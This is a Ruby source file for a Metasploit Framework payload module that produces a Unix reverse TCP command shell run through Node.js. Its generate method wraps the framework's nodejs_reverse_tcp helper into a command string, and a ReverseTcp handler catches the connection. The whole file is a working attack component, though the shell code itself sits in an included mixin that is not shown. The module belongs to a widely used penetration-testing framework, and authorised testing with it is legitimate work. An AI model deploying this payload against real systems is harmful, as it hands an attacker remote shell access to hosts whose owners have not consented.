##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 3231

  include Msf::Payload::Single
  include Msf::Payload::NodeJS
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Reverse TCP (via nodejs)',
        'Description' => 'Continually listen for a connection and spawn a command shell via nodejs',
        'Author' => 'joev',
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'node',
        'Payload' => { 'Offsets' => {}, 'Payload' => '' }
      )
    )
  end

  def generate(_opts = {})
    super + command_string
  end

  def command_string
    nodejs_cmd(nodejs_reverse_tcp)
  end
end
